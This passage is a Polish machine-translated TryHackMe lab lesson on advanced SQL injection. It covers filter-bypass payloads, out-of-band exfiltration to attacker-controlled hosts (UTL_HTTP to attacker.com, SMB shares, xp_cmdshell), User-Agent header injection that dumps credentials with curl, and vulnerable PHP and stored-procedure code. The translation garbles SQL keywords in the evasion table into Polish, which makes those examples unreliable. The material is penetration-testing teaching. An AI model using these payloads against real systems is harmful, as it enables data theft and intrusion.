- **Znaki tabulacji lub nowej linii** : Innym podejściem jest użycie znaków tabulacji ( `\t`) lub nowej linii ( `\n`) jako zamienników spacji. Niektóre filtry mogą dopuszczać te znaki, umożliwiając atakującemu skonstruowanie zapytania, takiego jak `SELECT\t*\tFROM\tusers\tWHERE\tname\t=\t'admin'`. Ta technika pozwala ominąć filtry, które wyszukują spacje.
- **Znaki alternatywne** : Jedną z efektywnych metod jest użycie alternatywnych znaków zakodowanych w adresie URL, reprezentujących różne rodzaje spacji, takich jak `%09`(tabulator poziomy), `%0A` (nowa linia), `%0C` (nowa strona), `%0D`(powrót karetki) i `%A0`(spacja nierozdzielająca). Znaki te mogą zastąpić spacje w treści. 

Przykład praktyczny

W tym scenariuszu mamy punkt końcowy, `http://MACHINE_IP/space/search_users.php?username=?`który zwraca dane użytkownika na podstawie podanej nazwy użytkownika. Deweloper zaimplementował filtry blokujące popularne słowa kluczowe typu SQL injection, takie jak OR, AND i spacje (%20), aby chronić przed atakami typu SQL injection.

Oto jestPHPfiltrowanie dodane przez programistę.

```php
$special_chars = array(" ", "AND", "and" ,"or", "OR" , "UNION", "SELECT");
$username = str_replace($special_chars, '', $username);
$sql = "SELECT * FROM user WHERE username = '$username'";
```

Jeśli użyjemy naszego standardowego ładunku `1%27%20||%201=1%20--+`na punkcie końcowym, zobaczymy, że nawet przy kodowaniu adresu URL nie działa.

![wstrzyknięcie z nieprawidłowym ładunkiem](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716108426440)

Zapytanie SQL pokazuje, że spacje są pomijane przez kod.  Aby ominąć te zabezpieczenia, możemy użyć znaków zakodowanych w adresie URL, które reprezentują różne typy odstępów lub podziałów wiersza, takich jak `%09`(tabulator poziomy), `%0A`(znak nowej linii). Znaki te mogą zastąpić spacje i nadal być poprawnie interpretowane przez parser SQL.

Oryginalny ładunek `1' OR 1=1 --`można zmodyfikować, aby używał znaków nowej linii zamiast spacji, co skutkuje otrzymaniem ładunku `1'%0A||%0A1=1%0A--%27+`. Ten ładunek konstruuje ten sam warunek logiczny, `1' OR 1=1 --`ale używa znaków nowej linii, aby ominąć filtr spacji.

Analizator składniowy SQL interpretuje znaki nowej linii jako spacje, przekształcając ładunek w `1' OR 1=1 --`. W związku z tym zapytanie zostanie zinterpretowane  `SELECT * FROM users WHERE username = '$username'`z  `SELECT * FROM users WHERE username = '1' OR 1=1 --`.

Teraz, jeśli uzyskamy dostęp do punktu końcowego poprzez zaktualizowany ładunek, będziemy mogli zobaczyć wszystkie szczegóły. 

![wstrzyknięcie z prawidłowym ładunkiem](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716108947600)

Podsumowując, ważne jest, aby zrozumieć, że żadna pojedyncza technika nie gwarantuje obejścia filtrów ani zapór sieciowych aplikacji internetowych (WAF) zaprojektowanych w celu zapobiegania atakom typu SQL injection .  Oto jednak kilka wskazówek i trików, które można wykorzystać do obejścia tych zabezpieczeń. Poniższa tabela przedstawia różne techniki, które można zastosować, aby spróbować ominąć filtry i zapory sieciowe aplikacji internetowych (WAF):

|   |   |   |
|---|---|---|
|**Scenariusz**|**Opis**|**Przykład**|
|**Słowa kluczowe takie jak SELECT są zakazane**|Słowa kluczowe SQL można często pominąć, zmieniając ich wielkość liter lub dodając komentarze w tekście, aby je rozdzielić|WYBIERZ * Z użytkowników lub SE/**/LECT * Z/**/użytkowników|
|**Przestrzenie są zakazane**|Użycie alternatywnych znaków odstępu lub komentarzy zamiast spacji może pomóc ominąć filtry.|WYBIERZ%0A*%0Z%0Aużytkowników lub WYBIERZ/**/*/**/Z/**/użytkowników|
|**Operatory logiczne takie jak AND, OR są zakazane**|Korzystanie z alternatywnych operatorów logicznych lub konkatenacji w celu ominięcia filtrów słów kluczowych.|nazwa użytkownika = 'admin' i hasło = 'hasło' lub nazwa użytkownika = 'admin'/**/\|/**/1=1 --|
|**Popularne słowa kluczowe, takie jak UNION, SELECT, są zakazane**|Korzystanie z równoważnych reprezentacji, takich jak kodowanie szesnastkowe lub Unicode, w celu ominięcia filtrów.|WYBIERZ * Z użytkowników GDZIE nazwa użytkownika = CHAR(0x61,0x64,0x6D,0x69,0x6E)|
|**Zabronione są określone słowa kluczowe, takie jak OR, AND, SELECT, UNION**|Stosowanie technik zaciemniania w celu ukrycia słów kluczowych SQL poprzez łączenie znaków z funkcjami łańcuchowymi lub komentarzami.|WYBIERZ * Z użytkowników GDZIE nazwa użytkownika = POŁĄCZ('a','d','m','i','n') lub WYBIERZ/**/nazwa użytkownika/**/Z/**/użytkownicy|

W rzeczywistych środowiskach, zapytania, które stosujesz, i widoczność filtrowanych słów kluczowych nie są bezpośrednio możliwe. Jako pentester, ważne jest, aby zrozumieć, że testy wstrzykiwania kodu SQL często wymagają podejścia próbnego, wymagającego cierpliwości i wytrwałości. Każde środowisko może mieć unikalne filtry i zabezpieczenia, co sprawia, że ​​znalezienie skutecznego wektora wstrzykiwania kodu wymaga adaptacji i wypróbowania różnych technik.


Poza pasmem (OOB)SQLWstrzyknięcie to technika ataku wykorzystywana przez pentesterów/zespoły red team do eksfiltracji danych lub wykonywania złośliwych działań, gdy metody bezpośrednie lub tradycyjne są nieskuteczne. W przeciwieństwie do wstrzykiwania SQL w paśmie In-band, gdzie atakujący wykorzystuje ten sam kanał do ataku i pobierania danych, wstrzykiwanie SQL poza pasmem wykorzystuje oddzielne kanały do ​​wysyłania danych i odbierania odpowiedzi. Techniki poza pasmem wykorzystują takie funkcje, jak:**HTTP** upraszanie,**DNS** zapytania,**MŚP** Protokół lub inne protokoły sieciowe, do których serwer bazy danych może mieć dostęp, umożliwiając atakującym omijanie zapór sieciowych, systemów wykrywania włamań i innych środków bezpieczeństwa.

![przepływ procesu wtrysku OOB|700](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1717060822273)  

Jedną z kluczowych zalet wstrzykiwania kodu SQL poza pasmem (Out-of-band SQL injection) jest jego niewidzialność i niezawodność. Wykorzystując **różne kanały komunikacji** , atakujący mogą zminimalizować ryzyko wykrycia i utrzymać stałe połączenie z zainfekowanym systemem. Na przykład, atakujący może wstrzyknąć **ładunek SQL, który spowoduje wysłanie przez serwer bazy danych żądania DNS** do złośliwej domeny kontrolowanej przez atakującego. Odpowiedź może następnie zostać wykorzystana do wydobycia poufnych danych bez powiadamiania mechanizmów bezpieczeństwa monitorujących bezpośrednie interakcje z bazą danych. Ta metoda pozwala atakującym wykorzystać luki w zabezpieczeniach nawet w złożonych środowiskach sieciowych, w których bezpośrednia łączność między atakującym a celem jest ograniczona lub kontrolowana. 

Dlaczego warto używać OOB

W scenariuszach, w których bezpośrednie odpowiedzi są oczyszczane lub ograniczane przez środki bezpieczeństwa, kanały OOB umożliwiają atakującym eksfiltrację danych bez natychmiastowej informacji zwrotnej z serwera. Na przykład mechanizmy bezpieczeństwa, takie jak **procedury składowane** , **kodowanie danych wyjściowych** i **ograniczenia na poziomie aplikacji** , mogą **uniemożliwić bezpośrednie odpowiedzi** , czyniąc tradycyjne ataki typu SQL injection nieskutecznymi. Techniki out-of-band, takie jak użycie żądań DNS lub HTTP, umożliwiają przesłanie danych do zewnętrznego serwera kontrolowanego przez atakującego, obchodząc te ograniczenia.

Ponadto **systemy wykrywania włamań (IDS)** i **zapory sieciowe aplikacji internetowych (WAF)** często **monitorują i rejestrują odpowiedzi na zapytania SQL pod kątem podejrzanej aktywności** , blokując bezpośrednie odpowiedzi z potencjalnie złośliwych zapytań. Wykorzystując kanały OOB, atakujący mogą uniknąć wykrycia, używając mniej kontrolowanych protokołów sieciowych, takich jak DNS lub SMB, do przesyłania danych. Jest to szczególnie przydatne w środowiskach sieciowych z ograniczoną bezpośrednią łącznością między atakującym a serwerem bazy danych, na przykład gdy serwer znajduje się za…zapora sieciowalub w innym segmencie sieci.

Techniki w różnych bazach danych

Ataki typu out-of-band SQL injection wykorzystują metodologię zapisu do innego kanału komunikacyjnego za pomocą spreparowanego zapytania. Technika ta jest skuteczna w przypadku eksfiltracji danych lub wykonywania złośliwych działań, gdy bezpośrednia interakcja z bazą danych jest ograniczona. W bazie danych istnieje wiele poleceń, które mogą umożliwiać eksfiltrację, ale poniżej znajduje się lista najczęściej używanych w różnych systemach baz danych:

**MySQL i MariaDB**

W MySQL lub MariaDB wstrzykiwanie kodu SQL poza pasmem można osiągnąć za pomocą  [polecenia SELECT ... INTO OUTFILE(otwiera się w nowej karcie)](https://dev.mysql.com/doc/refman/8.0/en/select-into.html)lub [załaduj_plik(otwiera się w nowej karcie)](https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_load-file)Polecenie. To polecenie pozwala atakującemu zapisać wyniki zapytania do pliku w systemie plików serwera. Na przykład:

```php
SELECT sensitive_data FROM users INTO OUTFILE '/tmp/out.txt';
```

Następnie atakujący może uzyskać dostęp do pliku za pośrednictwem udostępnionego serwera SMB lub HTTP uruchomionego na serwerze bazy danych i w ten sposób wykraść dane alternatywnym kanałem.

**Microsoft SQL Server (MSSQL)**

W MSSQL wstrzykiwanie kodu SQL poza pasmem można wykonać za pomocą funkcji takich jak [xp_cmdshell(otwiera się w nowej karcie)](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16), który umożliwia wykonywanie poleceń powłoki bezpośrednio z zapytań SQL. Można to wykorzystać do zapisu danych do pliku dostępnego za pośrednictwem udziału sieciowego:

```php
EXEC xp_cmdshell 'bcp "SELECT sensitive_data FROM users" queryout "\\10.10.58.187\logs\out.txt" -c -T';
```

Alternatywnie, można `OPENROWSET`go `BULK INSERT`używać do interakcji z zewnętrznymi źródłami danych, ułatwiając eksfiltrację danych przez kanały OOB.  

**Wyrocznia**  

W bazach danych Oracle wstrzykiwanie kodu SQL poza pasmem można wykonać za pomocą protokołu [UTL_HTTP(otwiera się w nowej karcie)](https://docs.oracle.com/en/database/oracle/oracle-database/19/arpls/UTL_HTTP.html)lub [UTL_FILE(otwiera się w nowej karcie)](https://docs.oracle.com/en/database/oracle/oracle-database/19/arpls/UTL_FILE.html)Pakiety. Na przykład pakiet UTL_HTTP można wykorzystać do wysyłania żądań HTTP zawierających poufne dane:

```php
DECLARE
  req UTL_HTTP.REQ;
  resp UTL_HTTP.RESP;
BEGIN
  req := UTL_HTTP.BEGIN_REQUEST('http://attacker.com/exfiltrate?sensitive_data=' || sensitive_data);
  UTL_HTTP.GET_RESPONSE(req);
END;
```

Przykłady technik poza pasmem

Techniki wstrzykiwania SQL poza pasmem w MySQL i MariaDB mogą wykorzystywać różne protokoły sieciowe do eksfiltracji danych. Do głównych metod należą eksfiltracja DNS, żądania HTTP i udziały SMB. Każdą z tych technik można zastosować w zależności od możliwości środowiska MySQL/MariaDB i konfiguracji sieci.  

**Żądania HTTP**  

Wykorzystując funkcje bazy danych, które zezwalają na żądania HTTP, atakujący mogą wysyłać poufne dane bezpośrednio do kontrolowanego przez siebie serwera WWW. Ta metoda wykorzystuje funkcjonalności bazy danych, które umożliwiają nawiązywanie wychodzących połączeń HTTP. Chociaż MySQL i MariaDB nie obsługują natywnie żądań HTTP, można to zrobić za pomocą zewnętrznych skryptów lub funkcji zdefiniowanych przez użytkownika (UDF), jeśli baza danych jest skonfigurowana tak, aby zezwalała na takie operacje.

Najpierw należy utworzyć i zainstalować UDF, aby obsługiwał żądania HTTP. Ta konfiguracja jest złożona i zazwyczaj wymaga dodatkowej konfiguracji. Przykładowe zapytanie wyglądałoby następująco `SELECT http_post('http://attacker.com/exfiltrate', sensitive_data) FROM books;`:

Eksfiltrację żądań HTTP można zaimplementować w systemach Windows i Linux (Ubuntu), w zależności od tego, czy baza danych obsługuje zewnętrzne skrypty lub funkcje UDF umożliwiające obsługę żądań HTTP.

**Eksfiltracja DNS** 

Atakujący mogą używać zapytań SQL do generowania żądań DNS z zakodowanymi danymi, które są wysyłane do złośliwego serwera DNS kontrolowanego przez atakującego. Technika ta omija systemy monitorowania oparte na protokole HTTP i wykorzystuje możliwości bazy danych do przeprowadzania wyszukiwań DNS.

Jak już wspomniano powyżej, MySQL nie obsługuje natywnie generowania żądań DNS wyłącznie za pomocą poleceń SQL. Osoby atakujące mogą wykorzystać inne środki, takie jak niestandardowe funkcje zdefiniowane przez użytkownika (UDF) lub skrypty systemowe, aby wykonywać wyszukiwania DNS.

**Eksfiltracja SMB**

Eksfiltracja SMB polega na zapisywaniu wyników zapytania do udziału SMB na serwerze zewnętrznym. Ta technika jest szczególnie skuteczna w środowiskach Windows, ale po odpowiedniej konfiguracji można ją również skonfigurować w systemach Linux. Przykładowe zapytanie wyglądałoby następująco `SELECT sensitive_data INTO OUTFILE '\\\\10.10.162.175\\logs\\out.txt';`:

Jest to w pełni obsługiwane, ponieważ system Windows natywnie obsługuje ścieżki SMB/UNC.Linux(Ubuntu): Chociaż bezpośrednie ścieżki UNC są bardziej natywne dla systemu Windows, udziały SMB można montować i uzyskiwać do nich dostęp w systemie Linux za pomocą narzędzi takich jak `smbclient`lub , montując udział w katalogu lokalnym. Bezpośrednie użycie ścieżek UNC w zapytaniach SQL może wymagać dodatkowej konfiguracji lub skryptów ułatwiających interakcję.

Przykład praktyczny

W tym praktycznym scenariuszu pokażemy, jak atakujący może wykraść dane z podatnej aplikacji internetowej, wykorzystując technikę wstrzykiwania kodu SQL poza pasmem (Out-of-band SQL injection). Kod po stronie serwera zawiera lukę w zabezpieczeniach, umożliwiającą atakującemu stworzenie ładunku, który zapisuje wyniki zapytania w zewnętrznym udziale SMB. Jest to przydatne, gdy bezpośrednie odpowiedzi z bazy danych są ograniczone lub monitorowane.

**Wyjaśnienie scenariusza**

W tym scenariuszu włączylibyśmy udział sieciowy w AttackBoxie pod adresem `ATTACKBOX_IP\logs`. Ten udział jest dostępny przez sieć i umożliwia zapisywanie w nim plików z innych komputerów. Można założyć scenariusz, w którym masz podatny na ataki system i chcesz przenieść dane do innego systemu z udziałem sieciowym. Atakujący wykorzysta ten udział do wykradania danych poza pasmem. Aby utworzyć udział sieciowy, uruchamiamy AttackBoxa i wykonujemy następujące polecenie w terminalu:  

- Przejdź do `impacket`katalogu za pomocą`cd /opt/impacket/examples`
- Wprowadź polecenie  `python3.9 smbserver.py -smb2support -comment "My Logs Server" -debug logs /tmp`, aby uruchomić serwer SMB udostępniający `/tmp`katalog.
- Dostęp do zawartości udziału sieciowego można uzyskać, wprowadzając polecenie  `smbclient //ATTACKBOX_IP/logs -U guest -N`. Umożliwi to połączenie się z udziałem sieciowym, a następnie można wydać polecenie, `ls`aby wyświetlić listę wszystkich poleceń.

Mamy tę samą aplikację internetową z funkcją wyszukiwania, która wysyła zapytania do użytkowników odwiedzających bibliotekę. Kod po stronie serwera dla tej funkcji jest podatny na ataki SQL injection i można uzyskać do niego dostęp pod adresem  `http://MACHINE_IP/oob/search_visitor.php?visitor_name=Tim`. 

![odpowiedź na normalne zapytanie](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716632404869)  

Kod serwera wygląda następująco:

```php
$visitor_name = $_GET['visitor_name'] ?? '';

$sql = "SELECT * FROM visitor WHERE name = '$visitor_name'";

echo "<p>Generated SQL Query: $sql</p>";

// Execute multi-query
if ($conn->multi_query($sql)) {
    do {
        // Store first result set
        if ($result = $conn->store_result()) {
            if ($result->num_rows > 0) {
                while ($row = $result->fetch_assoc()) {
```

**Ważne uwagi**

Należy pamiętać, że zmienna systemowa MySQL `secure_file_priv`może być ustawiona. Po ustawieniu zmienna ta zawiera ścieżkę do katalogu, a MySQL zezwala na zapisywanie plików tylko w tym określonym katalogu. To zabezpieczenie pomaga zminimalizować ryzyko nieautoryzowanych operacji na plikach. 

- **Gdy parametr secure_file_priv jest ustawiony** : MySQL ograniczy operacje na plikach, takie jak **INTO OUTFILE,** do określonego katalogu. Oznacza to, że atakujący mogą zapisywać pliki tylko w tym katalogu, ograniczając możliwość wykradania danych do dowolnych lokalizacji.
- **Gdy zmienna secure_file_priv jest pusta** : Jeśli `secure_file_priv`zmienna jest pusta, MySQL nie nakłada żadnych ograniczeń katalogowych, umożliwiając zapisywanie plików w dowolnym katalogu dostępnym dla procesu serwera MySQL. Taka konfiguracja stwarza większe ryzyko, ponieważ zapewnia atakującym większą elastyczność.

Atakujący zazwyczaj nie mają bezpośredniego dostępu do sprawdzenia wartości zmiennej secure_file_priv. W rezultacie muszą polegać na metodach prób i błędów, aby ustalić, czy i gdzie mogą zapisać pliki, testując różne ścieżki, aby sprawdzić, czy operacje na plikach się powiodą.  

**Przygotowanie ładunku**

Aby wykorzystać tę lukę, atakujący tworzy ładunek, który wstrzykuje do `visitor_name`parametru. Ładunek będzie zaprojektowany tak, aby wykonać dodatkowe zapytanie SQL, które zapisze informacje o wersji bazy danych w zewnętrznym udziale SMB.  

```php
1'; SELECT @@version INTO OUTFILE '\\\\ATTACKBOX_IP\\logs\\out.txt'; --
```

Przyjrzyjmy się bliżej powyższemu ładunkowi:

- `1'`: Zamyka oryginalny ciąg w zapytaniu SQL.
- `;`: Kończy pierwsze polecenie SQL.
- `SELECT @@version INTO OUTFILE '\\\\ATTACKBOX_IP\\logs\\out.txt';`: Wykonuje nowe polecenie SQL, które pobiera wersję bazy danych i zapisuje ją w udostępnionym folderze SMB w pliku \\ ATTACKBOX_IP \logs\out.txt.
- `--`:Komentuje resztę oryginalnego zapytania SQL, aby zapobiec błędom składniowym.

Aby wykorzystać ładunek, atakujący musiał odwiedzić adres URL, który tworzy plik w zewnętrznym udziale SMB. 

Aby uzyskać dostęp do pliku, użyj , `ls /tmp`aby zobaczyć otrzymany plik w `/tmp` katalogu, jak pokazano poniżej:   

Terminal

```shell-session
thm@machine$ls /tmp
out.txt
```

ZaawansowanySQLWstrzyknięcie obejmuje szereg zaawansowanych metod wykraczających poza podstawowe ataki. Oto kilka ważnych, zaawansowanych technik, o których powinni wiedzieć pentesterzy:

HTTPWstrzyknięcie nagłówka

Nagłówki HTTP mogą zawierać dane wprowadzane przez użytkownika, które mogą być wykorzystywane w zapytaniach SQL po stronie serwera. ![wstrzykiwanie agenta użytkownika|405](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716922785793)Jeśli te dane wejściowe nie zostaną oczyszczone, może to prowadzić do ataku typu SQL injection. Technika ta polega na manipulowaniu nagłówkami HTTP (takimi jak **User-Agent** , **Referer** lub **X-Forwarded-For** ) w celu wstrzyknięcia poleceń SQL. Serwer może rejestrować te nagłówki lub wykorzystywać je w zapytaniach SQL. Na przykład, złośliwy nagłówek User-Agent wyglądałby tak  `User-Agent: ' OR 1=1; --`: .  Jeśli serwer uwzględni nagłówek User-Agent w zapytaniu SQL bez jego oczyszczenia, może to prowadzić do ataku typu SQL injection.

W tym przykładzie aplikacja internetowa rejestruje nagłówek User-Agent z żądań HTTP w tabeli o nazwie „logs” w bazie danych. Aplikacja udostępnia punkt końcowy, w `http://MACHINE_IP/httpagent/`którym wyświetlane są wszystkie zarejestrowane wpisy z tabeli „logs”. Gdy użytkownicy odwiedzają stronę internetową, ich przeglądarka wysyła nagłówek User-Agent, który identyfikuje przeglądarkę i system operacyjny. Ten nagłówek jest zazwyczaj używany do rejestrowania zdarzeń lub do dostosowywania treści do konkretnych przeglądarek. W naszej aplikacji ten nagłówek User-Agent jest wstawiany do tabeli „logs” i można go następnie przeglądać za pośrednictwem podanego punktu końcowego.

Biorąc pod uwagę punkt końcowy, atakujący może próbować wstrzyknąć kod SQL do nagłówka User-Agent, aby wykorzystać luki w zabezpieczeniach SQL injection. Na przykład, ustawiając nagłówek User-Agent na szkodliwą wartość, taką jak `User-Agent: ' UNION SELECT username, password FROM user; --`, atakujący próbuje wstrzyknąć kod SQL, który łączy wyniki z tabeli logów z poufnymi danymi z tabeli użytkownika.

Oto kod po stronie serwera, który wstawia logi.

```php
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$insert_sql = "INSERT INTO logs (user_Agent) VALUES ('$userAgent')";
if ($conn->query($insert_sql) === TRUE) {
    echo "<p class='text-green-500'>New logs inserted successfully</p>";
} else {
    echo "<p class='text-red-500'>Error: " . $conn->error . " (Error Code: " . $conn->errno . ")</p>";
}

$sql = "SELECT * FROM logs WHERE user_Agent = '$userAgent'";
..
... 
```

Wartość User-Agent jest wstawiana do tabeli dzienników za pomocą instrukcji SQL INSERT. Jeśli wstawianie zakończy się powodzeniem, wyświetlany jest komunikat o powodzeniu. W przypadku wystąpienia błędu podczas wstawiania wyświetlany jest komunikat o błędzie ze szczegółami .

![pulpit nawigacyjny do przeglądania dzienników](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716115666836)  

**Przygotowanie ładunku**

Przygotujemy i wstrzykniemy ładunek SQL do nagłówka User-Agent, aby zademonstrować, jak można wykorzystać atak typu SQL injection za pomocą nagłówków HTTP. Naszym docelowym ładunkiem będzie  komenda UNION SELECT username, password FROM user; #.  Ten ładunek ma na celu:

- **Zamknij istniejący literał ciągu** : Początkowy pojedynczy cudzysłów ( `'`) służy do zamknięcia istniejącego literału ciągu w zapytaniu SQL.
- **Wstrzyknij instrukcję UNION SELECT** : `UNION SELECT username, password FROM user;`Część danych jest używana do pobierania kolumn nazwy użytkownika i hasła z tabeli użytkowników.
- **Zakomentuj resztę zapytania** : Ten `#`znak służy do zakomentowania reszty zapytania SQL, co gwarantuje, że każdy kolejny kod SQL zostanie zignorowany.

Musimy wysłać ten ładunek jako część nagłówka User-Agent w naszym żądaniu HTTP, aby go wstrzyknąć. Można to zrobić za pomocą narzędzi takich jak **Burp Suite** lub **cURL** . Użyjemy narzędzia wiersza poleceń curl do wysłania żądania HTTP z niestandardowym nagłówkiem User-Agent.  Otwórz terminal i uzyskaj dostęp do interfejsu wiersza poleceń.  Użyj poniższego polecenia, aby wysłać żądanie z niestandardowym `User-Agent`nagłówkiem:

Przykładowy terminal

```shell-session
user@tryhackme$ curl -H "User-Agent: ' UNION SELECT username, password FROM user; # " http://MACHINE_IP/httpagent/
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SQL Injection </title>
 rel="stylesheet">
</head>
<body class="bg-gray-100">
    <div class="container mx-auto p-8">
        <h1 class="text-4xl font-bold mb-8 text-center">HTTP Logs</h1>
        <div class="bg-white p-6 rounded-lg shadow-lg">

<p class='text-gray-600 text-sm mb-4'>Generated SQL Query: <span class='text-red-500'>SELECT * FROM logs WHERE user_Agent = '' UNION SELECT username, password FROM user; #'</span></p><div class='p-4 bg-gray-100 rounded shadow mb-4'><p class='font-bold'>id: <span class='text-gray-700'>bob</span></p><p class='font-bold'>user_Agent: <span class='text-gray-700'>bob@123</span></p></div><div class='p-4 bg-gray-100 rounded shadow mb-4'><p class='font-bold'>id: <span class='text-gray-700'>attacker</span></p><p class='font-bold'>user_Agent: <span class='text-gray-700'>tesla</span></p></div>
        </div>
    </div>
</body>
</html>
```

Odpowiedź serwera zostanie wyświetlona w terminalu. Jeśli wstrzyknięcie SQL zakończy się powodzeniem, w odpowiedzi zobaczysz wyodrębnione dane (nazwy użytkowników i hasła).

Wykorzystywanie procedur składowanych

Procedury składowane to procedury przechowywane w bazie danych, które mogą wykonywać różne operacje, takie jak wstawianie, aktualizowanie czy wyszukiwanie danych. Chociaż procedury składowane mogą pomóc w poprawie wydajności i zapewnieniu spójności, mogą być również podatne na ataki typu SQL injection, jeśli nie zostaną odpowiednio obsłużone.

![przepływ procesu procedury składowanej|700](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716922785792)  

Procedury składowane to prekompilowane instrukcje SQL, które mogą być wykonywane jako pojedyncza jednostka. Są one przechowywane w bazie danych i mogą być wywoływane przez aplikacje w celu wykonania określonych zadań. Procedury składowane mogą akceptować parametry, co zwiększa ich elastyczność i wydajność. Jeśli jednak parametry te nie zostaną odpowiednio oczyszczone, mogą one stanowić zagrożenie podatnościami na ataki typu SQL injection.

Rozważmy procedurę składowaną przeznaczoną do pobierania danych użytkownika na podstawie jego nazwy:

```php
CREATE PROCEDURE sp_getUserData
    @username NVARCHAR(50)
AS
BEGIN
    DECLARE @sql NVARCHAR(4000)
    SET @sql = 'SELECT * FROM users WHERE username = ''' + @username + ''''
    EXEC(@sql)
END
```

W tym przykładzie procedura składowana łączy parametr @username z dynamicznym zapytaniem SQL. To podejście jest podatne na atak SQL injection, ponieważ dane wejściowe nie są oczyszczane.

Wstrzykiwanie XML i JSON   

  

Aplikacje, które analizują dane XML lub JSON i wykorzystują je w zapytaniach SQL, mogą być podatne na wstrzyknięcie, jeśli dane wejściowe nie zostaną odpowiednio oczyszczone. Wstrzyknięcie XML i JSON polega na wstrzykiwaniu złośliwych danych do struktur XML lub JSON, które są następnie wykorzystywane w zapytaniach SQL. Może się to zdarzyć, gdy aplikacja bezpośrednio wykorzystuje przeanalizowane wartości w poleceniach SQL.

```php
{
  "username": "admin' OR '1'='1--",
  "password": "password"
}
```

Jeśli aplikacja użyje tych wartości bezpośrednio w zapytaniu SQL, np. `SELECT * FROM users WHERE username = 'admin' OR '1'='1'-- AND password = 'password'`, może to skutkować atakiem typu injection.

SQLWstrzyknięcia pozostają powszechnym zagrożeniem ze względu na niewłaściwą implementację zabezpieczeń i złożoność różnych frameworków internetowych _._  Automatyzacja identyfikacji i wykorzystania tych luk może być trudna, ale opracowano szereg narzędzi i technik, które usprawniają ten proces.![automatyzacja wstrzykiwania SQL](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716923453053)  

Główne problemy podczas identyfikacji

Identyfikacja luk w zabezpieczeniach typu SQL Injection wiąże się z kilkoma wyzwaniami, podobnymi do identyfikacji innych luk po stronie serwera. Oto kluczowe kwestie:

- **Dynamiczna natura zapytań SQL** : zapytania SQL mogą być konstruowane dynamicznie, co utrudnia wykrywanie punktów włamania. Złożone zapytania z wieloma warstwami logiki mogą maskować potencjalne luki w zabezpieczeniach.
- **Różnorodność punktów wstrzyknięcia** : Wstrzyknięcie SQL może wystąpić w różnych częściach aplikacji, w tym w polach wprowadzania,HTTPNagłówki i parametry URL. Identyfikacja wszystkich potencjalnych punktów wstrzyknięcia wymaga dokładnego przetestowania i dogłębnego zrozumienia aplikacji.
- **Stosowanie środków bezpieczeństwa** : Aplikacje mogą używać przygotowanych instrukcji, sparametryzowanych zapytań iORMframeworki, które mogą zapobiegać atakom typu SQL Injection. Zautomatyzowane narzędzia muszą być w stanie odróżniać bezpieczne i niebezpieczne konstrukcje zapytań.
- **Wykrywanie zależne od kontekstu** : Kontekst, w którym dane wprowadzane przez użytkownika są wykorzystywane w zapytaniach SQL, może być bardzo zróżnicowany. Narzędzia muszą dostosowywać się do różnych kontekstów, aby precyzyjnie identyfikować luki w zabezpieczeniach.

Kilka ważnych narzędzi

W społeczności zajmującej się bezpieczeństwem opracowano kilka uznanych narzędzi i projektów, które wspomagają automatyzację wyszukiwania luk w zabezpieczeniach typu SQL Injection. Oto kilka znanych narzędzi i repozytoriów GitHub, które oferują funkcje wykrywania i wykorzystywania luk w zabezpieczeniach typu SQL Injection:

- **[Mapa SQL(otwiera się w nowej karcie)](https://github.com/sqlmapproject/sqlmap)**SQLMap to narzędzie open source, które automatyzuje proces wykrywania i wykorzystywania luk w zabezpieczeniach SQL Injection w aplikacjach internetowych. Obsługuje szeroką gamę baz danych i oferuje rozbudowane opcje identyfikacji i wykorzystania luk. Więcej informacji o tym narzędziu można znaleźć [tutaj](https://tryhackme.com/r/room/sqlmap) .
- **[SQLNinja(otwiera się w nowej karcie)](https://github.com/xxgrunge/sqlninja)**SQLNinja to narzędzie zaprojektowane specjalnie do wykorzystywania luk w zabezpieczeniach SQL Injection w aplikacjach internetowych, które wykorzystują Microsoft SQL Server jako bazę danych zaplecza. Automatyzuje ono różne etapy wykorzystania luk, w tym odciski palców bazy danych i ekstrakcję danych. 
- [**Wstrzyknięcie JSQL**(otwiera się w nowej karcie)](https://github.com/ron190/jsql-injection): Biblioteka Java skoncentrowana na wykrywaniu luk w zabezpieczeniach typu SQL Injection w aplikacjach Java . Obsługuje różne typy ataków typu SQL Injection i oferuje szereg opcji ekstrakcji danych i przejęcia kontroli nad bazą danych.
- **[BBQSQL(otwiera się w nowej karcie)](https://github.com/CiscoCXSecurity/bbqsql)**:  BBQSQL to framework służący do wykorzystywania luk w zabezpieczeniach typu Blind SQL Injection, który jest prosty i wysoce skuteczny w celu zautomatyzowanego wykorzystywania luk w zabezpieczeniach typu Blind SQL Injection. 

Automatyzacja identyfikacji i wykorzystywania luk w zabezpieczeniach typu SQL Injection ma kluczowe znaczenie dla utrzymania bezpieczeństwa aplikacji internetowych . Narzędzia takie jak SQLMap, SQLNinja i BBQSQL zapewniają zaawansowane możliwości wykrywania i wykorzystywania tych luk. Ważne jest jednak zrozumienie ograniczeń narzędzi automatycznych oraz konieczności ręcznej analizy i walidacji w celu zapewnienia kompleksowego zabezpieczenia. Integrując te narzędzia z procesem zabezpieczeń i stosując najlepsze praktyki dotyczące walidacji danych wejściowych i konstruowania zapytań, można skutecznie ograniczyć ryzyko związane z lukami w zabezpieczeniach typu SQL Injection.


